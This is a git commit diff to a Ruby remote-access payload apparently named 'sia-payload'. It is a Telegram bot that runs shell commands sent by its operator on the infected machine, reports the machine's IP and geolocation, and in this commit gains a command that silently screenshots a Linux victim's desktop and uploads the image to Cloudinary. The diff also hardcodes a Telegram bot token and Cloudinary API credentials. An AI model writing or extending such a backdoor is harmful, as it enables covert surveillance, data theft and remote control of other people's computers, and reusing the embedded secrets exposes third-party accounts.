d5f238ae6fd926f5525ad0c4a1153b0d81b78317
ViRuS007 <shayanzare19@gmail.com>
2017-06-09 01:19:31 +0430

    Add Take screenshot in linux

--- payload_bot.rb
+++ payload_bot.rb
@@ -3,6 +3,8 @@
 #   Coded by ViRuS007
 
 require "telegram/bot"
+require "cloudinary"
+require "json"
 
 $TOKEN = "304212840:AAHTNXoYw97LbyPbQL1F-su5mQKek7_neJo" 
 
@@ -18,6 +20,7 @@ Telegram::Bot::Client.run($TOKEN, logger: Logger.new($stdout)) do |bot|
             when '/help'
                 help = """Help:
     /info => To Get ip and system info
+    /screenShot => Get ScreenShot of system
     
 for run shell command just send without `/` and \nRecive result.
 
@@ -34,7 +37,35 @@ Github: http://github.com/shayanzare/sia-payload
                 host = Socket.gethostname
                 res = Net::HTTP.get(URI("http://ipinfo.io/json"))
                 resf = res.to_s
-                bot.api.send_message(chat_id: message.chat.id, text: "[*] Host name : #{host}\n\n#{resf}")
+                parsed = JSON.parse(resf)
+
+                bot.api.send_message(chat_id: message.chat.id, text: "[*] IP Adress : #{parsed["ip"]} \n[*] Host Name : #{parsed["hostname"]} \n
+[*] City : #{parsed["city"]} \n[*] Region : #{parsed["region"]} \n
+[*] Country : #{parsed["country"]} \n[*] Locations : #{parsed["loc"]} \n
+[*] Org : #{parsed["org"]}")
+
+            #Take screenshot with terminal (import) and cmd
+            when "/screenShot"
+                #check operatations system
+                if RUBY_PLATFORM =~ /win32/
+                    #windows platform
+
+                else
+                    #linux platform
+                    bot.api.send_message(chat_id: message.chat.id, text: "[!] Taking Screenshot and Uploading...\nPlease wait...")
+                    #get screenshot with shell linux
+                    res = %x{import -window root -resize 1360x768 -delay 200 screenshot.png}
+                    #setting Cloudinary api
+                    auth = {
+                        cloud_name: "dnno5u4ug",
+                        api_key:    "577794173378992",
+                        api_secret: "5MFNU2rcqMWg69lCHJDcxX15I_Y"
+                    }
+                    #sneding photo for upload
+                    s = Cloudinary::Uploader.upload("screenshot.png", auth)
+                    #send result to telegram bot
+                    bot.api.send_message(chat_id: message.chat.id, text: "[+] File Succesful Uploaded!\nURLs : \n#{s}")
+                end
             
             #Get other command
             else
